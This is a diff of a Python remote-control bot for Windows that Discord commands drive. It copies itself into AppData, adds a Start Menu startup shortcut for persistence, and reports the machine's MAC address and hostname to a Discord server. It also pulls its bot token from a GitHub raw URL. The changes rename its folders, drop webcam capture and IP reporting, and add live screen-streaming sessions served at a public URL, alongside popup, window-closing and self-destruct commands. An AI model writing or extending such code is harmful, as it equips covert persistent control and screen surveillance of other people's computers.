@@ -31,20 +31,21 @@ from PIL import Image
 from typing import Optional
 import win32com.client
 from pathlib import Path
+import socket as st1
 
 
 user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+target_path = os.path.join(user_profile, 'AppData', 'Local')
 os.makedirs(target_path, exist_ok=True)
 
-sys.stdout = open(os.path.join(target_path, "skibidi-mainmain", "log.txt"), "a", buffering=1)  # "a" = append mode, "buffering=1" = line buffering
+sys.stdout = open(os.path.join(target_path, "RemoteControl-mainmain", "log.txt"), "a", buffering=1)  # "a" = append mode, "buffering=1" = line buffering
 sys.stderr = sys.stdout
 
 startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
 shortcut_name="MyPythonScript"
 shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 
-def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="MyPythonScript"):
+def add_to_startup(script_path=os.path.join(target_path, 'RemoteControl-startup', 'startup.pyw'), shortcut_name="MyPythonScript"):
 
     if script_path is None:
         script_path = sys.argv[0]
@@ -96,39 +97,21 @@ def check_connected_cameras():
 
     return connected_cameras
 
-
-
-def get_ipv6_address():
-    hostname = socket.gethostname()
-    
-    addr_info = socket.getaddrinfo(hostname, None, socket.AF_INET6)
-    
-    for addr in addr_info:
-        ipv6_address = addr[4][0]
-        return ipv6_address
-    
-def get_device_ip4():
-    hostname = socket.gethostname()
-    ip_address = socket.gethostbyname(hostname)
-    return ip_address
-
-
-
 def get_device_ip():
     mac = hex(uuid.getnode()).replace('0x', '').upper()
     return ':'.join(mac[i:i+2] for i in range(0, 12, 2))
 
 user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+target_path = os.path.join(user_profile, 'AppData', 'Local')
 os.makedirs(target_path, exist_ok=True)
 
 pyautogui.FAILSAFE = False
 
-path_to_cursor = os.path.join(target_path, 'skibidi-mainmain', 'cursor', 'cursor.png')
+path_to_cursor = os.path.join(target_path, 'RemoteControl-mainmain', 'cursor', 'cursor.png')
 cursor_image = Image.open(path_to_cursor)
 cursor_width, cursor_height = 16, 16
 
-with open(os.path.join(target_path, "skibidi-mainmain", "update.txt")) as ver9:
+with open(os.path.join(target_path, "RemoteControl-mainmain", "update.txt")) as ver9:
     ver8 = ver9.read()
     ver9.close()
 
@@ -152,9 +135,6 @@ async def on_ready():
             await guild.create_text_channel("events", category=category)
             await guild.create_text_channel("commands", category=category)
 
-            ipv6 = get_ipv6_address()
-            ipv4 = get_device_ip4()
-
             cameras = check_connected_cameras()
             if cameras:
                 cameras = "At least one camera found."
@@ -162,10 +142,7 @@ async def on_ready():
                 cameras = "No cameras found."
 
             des = f"""Mac address: {ip}
-            Ipv6: {ipv6}
-            Ipv4: {ipv4}
-
-            Cameras: {cameras}
+            Name: {st1.gethostname()}
 
             Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}
 
@@ -178,10 +155,7 @@ async def on_ready():
             channel = nextcord.utils.get(category.text_channels, name="info")
 
             des = f"""Mac address: {ip}
-            Ipv6: {ipv6}
-            Ipv4: {ipv4}
-
-            Cameras: {cameras}"""
+            Name: {st1.gethostname()}"""
 
             embed = nextcord.Embed(title="Client info:", timestamp=datetime.now(), colour=0xe4f500, description=des)
             embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
@@ -190,10 +164,10 @@ async def on_ready():
 
         if existing_category:
             user_profile = os.environ['USERPROFILE']
-            target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
-            if os.path.exists(os.path.join(target_path, "skibidi-mainmain", "update.txt")):
+            target_path = os.path.join(user_profile, 'AppData', 'Local')
+            if os.path.exists(os.path.join(target_path, "RemoteControl-mainmain", "update.txt")):
 
-                with open(os.path.join(target_path, "skibidi-mainmain", "update.txt")) as up:
+                with open(os.path.join(target_path, "RemoteControl-mainmain", "update.txt")) as up:
                     tex = up.read()
                     up.close()
 
@@ -212,11 +186,11 @@ async def on_ready():
                     embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
                     await channel13.send(embed=embed)
 
-                    with open(os.path.join(target_path, "skibidi-mainmain", "update.txt"), "w") as up:
+                    with open(os.path.join(target_path, "RemoteControl-mainmain", "update.txt"), "w") as up:
                         up.write("")
                         up.close()
 
-                    with open(os.path.join(target_path, "skibidi-mainmain", "ver.txt"), "w") as up2:
+                    with open(os.path.join(target_path, "RemoteControl-mainmain", "ver.txt"), "w") as up2:
                         up2.write(tex)
                         up2.close()
 
@@ -308,42 +282,14 @@ async def status(interaction : Interaction):
 
         await interaction.send(embed=embed, file=file)
 
-@client.slash_command(guild_ids=testServerId, description="Sends a picture off of the client's camera.")
-async def take_picture(interaction : Interaction):
-    category = interaction.channel.category
-    if str(category) == str(ip):
-        
-        user_id = interaction.user.id
-        await interaction.response.send_message("Taking picture...")
-        cap = cv2.VideoCapture(0)
-        if not cap.isOpened():
-            await interaction.edit_original_message(content="No camera found, failed to take picture.")
-        else:
-            ret, frame = cap.read()
-            if not ret:
-                await interaction.edit_original_message(content="Failed to grab frame.")
-                cap.release()
-            else:
-                cv2.imwrite('captured_image.jpg', frame)
-                cap.release()
-
-                file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'captured_image.png'), filename='captured_image.png')
-                embed = nextcord.Embed(description="Image", title="Captured image:", timestamp=datetime.now(), colour=0xb400f5)
-                embed.set_author(name="Remote Control Bot")
-                embed.set_image(url=f"attachment://captured_image.png")
-                embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
-
-                await interaction.send(embed=embed, file=file)
-                await interaction.delete_original_message()
-
 @client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
-async def self_destruct(interaction : Interaction):
+async def uninstall(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
         
         user_id = interaction.user.id
-        await interaction.response.send_message("Self-destructing client...")
-        await interaction.edit_original_message(content="Client most likely self destructed!")
+        await interaction.response.send_message("Uninstalling this program all clients...")
+        await interaction.edit_original_message(content="This program has been uninstalled from all clients!")
         script_content = """
 import shutil
 import os
@@ -356,9 +302,9 @@ import tempfile
 time.sleep(1)
 
 user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
-shutil.rmtree(os.path.join(target_path, "skibidi-startup"))
-shutil.rmtree(os.path.join(target_path, "skibidi-mainmain"))
+target_path = os.path.join(user_profile, 'AppData', 'Local')
+shutil.rmtree(os.path.join(target_path, "RemoteControl-startup"))
+shutil.rmtree(os.path.join(target_path, "RemoteControl-mainmain"))
 startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
 shortcut_name="MyPythonScript"
 shortcut_path = startup_dir / f"{shortcut_name}.lnk"
@@ -389,7 +335,7 @@ sys.exit()
 
         script_file = "self-destruct.pyw"
         user_profile = os.environ['USERPROFILE']
-        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+        target_path = os.path.join(user_profile, 'AppData', 'Local')
         if not os.path.exists(os.path.join(target_path, script_file)):
             with open(os.path.join(target_path, script_file), "w") as file:
                 file.write(script_content)
@@ -398,10 +344,10 @@ sys.exit()
         sys.exit(0)
 
 @client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
-async def self_destruct_all(interaction : Interaction):
+async def uninstall_all(interaction : Interaction):
     user_id = interaction.user.id
-    await interaction.response.send_message("Self-destructing all clients...")
-    await interaction.edit_original_message(content="Clients most likely self destructed!")
+    await interaction.response.send_message("Uninstalling this program all clients...")
+    await interaction.edit_original_message(content="This program has been uninstalled from all clients!")
     script_content = """
 import shutil
 import os
@@ -414,9 +360,9 @@ import tempfile
 time.sleep(1)
 
 user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
-shutil.rmtree(os.path.join(target_path, "skibidi-startup"))
-shutil.rmtree(os.path.join(target_path, "skibidi-mainmain"))
+target_path = os.path.join(user_profile, 'AppData', 'Local')
+shutil.rmtree(os.path.join(target_path, "RemoteControl-startup"))
+shutil.rmtree(os.path.join(target_path, "RemoteControl-mainmain"))
 startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
 shortcut_name="MyPythonScript"
 shortcut_path = startup_dir / f"{shortcut_name}.lnk"
@@ -447,7 +393,7 @@ sys.exit()
 
     script_file = "self-destruct.pyw"
     user_profile = os.environ['USERPROFILE']
-    target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+    target_path = os.path.join(user_profile, 'AppData', 'Local')
     if not os.path.exists(os.path.join(target_path, script_file)):
         with open(os.path.join(target_path, script_file), "w") as file:
             file.write(script_content)
@@ -455,7 +401,7 @@ sys.exit()
     subprocess.Popen(["pythonw", os.path.join(target_path, "self-destruct.pyw")])
     sys.exit(0)
     
-@client.slash_command(guild_ids=testServerId, description="Closes the window selected.")
+@client.slash_command(guild_ids=testServerId, description="Closes all windows on client's computer.")
 async def close_all_windows(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
@@ -517,16 +463,16 @@ async def popup(interaction : Interaction, message: str, window_title: Optional[
         fmsg = f"""X=MsgBox("{str(message)}",0+16,"{str(window_title)}")"""
 
         user_profile = os.environ['USERPROFILE']
-        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+        target_path = os.path.join(user_profile, 'AppData', 'Local')
 
-        with open(os.path.join(target_path, "skibidi-mainmain", "popup", "popup.vbs"), "w") as po:
+        with open(os.path.join(target_path, "RemoteControl-mainmain", "popup", "popup.vbs"), "w") as po:
             if repeat is None or repeat == 0:
                 repeat = 1
             for i in range(repeat):
                 po.write(fmsg + "\n")
             po.close()
 
-        subprocess.Popen(["wscript", os.path.join(target_path, "skibidi-mainmain", "popup", "popup.vbs")], shell=True)
+        subprocess.Popen(["wscript", os.path.join(target_path, "RemoteControl-mainmain", "popup", "popup.vbs")], shell=True)
         
         await interaction.response.send_message(f"Popup window succesfully opened with message: {message}")
 
@@ -536,15 +482,68 @@ async def output_log(interaction : Interaction):
     if str(category) == str(ip):
         await interaction.response.send_message("Sending log file...")
         user_profile = os.environ['USERPROFILE']
-        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
-        log_path = os.path.join(target_path, "skibidi-mainmain", "log.txt")
+        target_path = os.path.join(user_profile, 'AppData', 'Local')
+        log_path = os.path.join(target_path, "RemoteControl-mainmain", "log.txt")
         file1 = nextcord.File(log_path, filename='log.txt')
         await interaction.send(file=file1)
 
+@client.slash_command(guild_ids=testServerId, description="Starts a high quality live session of the client's view.")
+async def start_live_session(interaction : Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        
+        user_id = interaction.user.id
+        await interaction.response.send_message("Starting live session...")
+        global process
+        process = subprocess.Popen(["python", os.path.join(os.path.abspath(os.path.dirname(__file__)), 'website.py')])
+        time.sleep(5)
+        with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'public_url.txt'), 'r') as f:
+            public_url = f.read()
+        embed = nextcord.Embed(description="Live session started", title=f"{public_url}", timestamp=datetime.now(), colour=0xb400f5)
+        embed.set_author(name="Remote Control Bot")
+        embed.set_footer(text="Remote Control Bot v1.3")
 
+        await interaction.send(embed=embed)
+        await interaction.delete_original_message()
 
+@client.slash_command(guild_ids=testServerId, description="Starts a low quality live session of the client's view.")
+async def start_lq_live_session(interaction : Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        
+        user_id = interaction.user.id
+        await interaction.response.send_message("Starting live session...")
+        global process
+        process = subprocess.Popen(["python", os.path.join(os.path.abspath(os.path.dirname(__file__)), 'lowqwebsite.py')])
+        time.sleep(5)
+        with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'lqpublic_url.txt'), 'r') as f:
+            public_url = f.read()
+        embed = nextcord.Embed(description="Live session started", title=f"{public_url}", timestamp=datetime.now(), colour=0xb400f5)
+        embed.set_author(name="Remote Control Bot")
+        embed.set_footer(text="Remote Control Bot v1.3")
 
-r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
+        await interaction.send(embed=embed)
+        await interaction.delete_original_message()
+
+@client.slash_command(guild_ids=testServerId, description="Stops live session.")
+async def stop_live_session(interaction : Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        
+        user_id = interaction.user.id
+        await interaction.response.send_message("Stopping live session")
+        if process is not None:
+            process.kill()
+        else:
+            interaction.response.send_message("No live session found")
+        embed = nextcord.Embed(description="Status", title=f"Live session stopped", timestamp=datetime.now(), colour=0xb400f5)
+        embed.set_author(name="Remote Control Bot")
+        embed.set_footer(text="Remote Control Bot v1.3")
+
+        await interaction.send(embed=embed)
+        await interaction.delete_original_message()
+
+r = requests.get("https://raw.githubusercontent.com/noel-create/RemoteControl/refs/heads/main/tok")
 token = r.text
 stripped_string = token[1:]
 client.run(stripped_string)
